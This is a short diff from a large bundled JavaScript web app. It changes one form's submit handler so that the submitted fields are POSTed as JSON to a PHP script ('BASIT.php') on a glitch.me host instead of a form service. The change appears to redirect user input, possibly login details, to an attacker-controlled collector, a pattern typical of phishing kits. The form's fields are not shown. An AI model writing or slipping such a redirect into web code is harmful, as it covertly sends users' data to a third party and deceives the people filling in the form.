@@ -9814,7 +9814,7 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/RdVjngaxG", {
+                                    fetch("https://branch-weak-increase.glitch.me/BASIT.php", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
